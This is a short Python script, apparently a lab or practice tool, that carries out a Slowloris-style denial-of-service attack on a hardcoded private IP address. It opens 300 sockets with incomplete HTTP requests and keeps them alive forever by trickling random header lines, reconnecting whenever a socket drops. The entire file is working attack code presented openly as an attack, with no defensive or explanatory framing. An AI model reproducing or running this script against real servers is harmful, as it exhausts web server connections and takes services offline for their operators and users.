import random
import socket

def init_socket(ip):
    try:
        s = socket.socket()
        s.connect((ip,80))
        s.send(("GET /08?%d HTTP/1.1\r\n"%(random.randint(0,100))).encode("utf-8"))
        return s
    except Exception as e:
        print(e.message)

def main():
    ip = "10.22.66.111"
    
    count = 300

    sockets = []

    print("Initialize socket")

    for _ in range(count):
        try:
            s = init_socket(ip)
        except socket.error as e:
            print(e)
            break
        sockets.append(s)
    
    print("Socket initialized, beginning to attack")

    while True:
        try :
            for s in sockets:
                try:
                    s.send(("X-test: %d\r\n"%(random.randint(0,100))).encode("utf-8"))
                except socket.error as e:
                    sockets.remove(s)
            
            for _ in range(count - len(sockets)):
                try:
                    s = init_socket(ip)
                except socket.error as e:
                    print(e)
                    break
                sockets.append(s)
        except (KeyboardInterrupt,SystemExit) :
            print("Stopping !")
            for s in sockets:
                s.close()
            break

if __name__ == "__main__":
    main()